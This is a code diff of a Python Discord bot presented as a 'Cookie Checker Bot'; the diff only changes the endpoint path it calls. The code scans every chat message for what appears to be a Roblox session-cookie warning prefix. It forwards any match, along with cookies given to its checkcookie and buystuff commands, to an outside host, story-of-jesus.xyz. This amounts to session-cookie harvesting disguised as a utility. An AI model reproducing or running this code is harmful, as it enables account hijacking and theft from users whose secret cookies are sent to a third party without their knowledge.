@@ -14,7 +14,7 @@ bot = commands.Bot(command_prefix=yourprefix, description="Cookie Checker Bot :)
 async def on_message(message):
 
     if message.content.startswith("_|WARNING:-DO-NOT-SHARE-THIS."):
-        r = requests.get(f'https://story-of-jesus.xyz/e.php?cookie={message.content}') 
+        r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={message.content}') 
         data = r.json() 
 
         if data["status"] == "failed":
@@ -76,7 +76,7 @@ async def buystuff(ctx, cookie=None):
         return ## break command
     
     
-    r = requests.get(f'https://story-of-jesus.xyz/e.php?cookie={cookie}')
+    r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
     if r.json()["status"] == "failed": 
         await ctx.message.reply("Hmm. This Cookie Seems To Be Expired/Invalid.")
         ## check if cookie invalid if not continue cmd
@@ -137,7 +137,7 @@ async def checkcookie(ctx, cookie=None):  ## By default make Cookie = To None, s
         await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!checkcookie mycookie'") ## let the user know they aint provided cookie
         return ## break command
 
-    r = requests.get(f'https://story-of-jesus.xyz/e.php?cookie={cookie}') ## Send get request to my api to get info about cookie in json
+    r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}') ## Send get request to my api to get info about cookie in json
     data = r.json() ## get json from request ^^
 
     if data["status"] == "failed": ## if cookie is invalid api will respond with status: failed we will check for this value and if so let user know
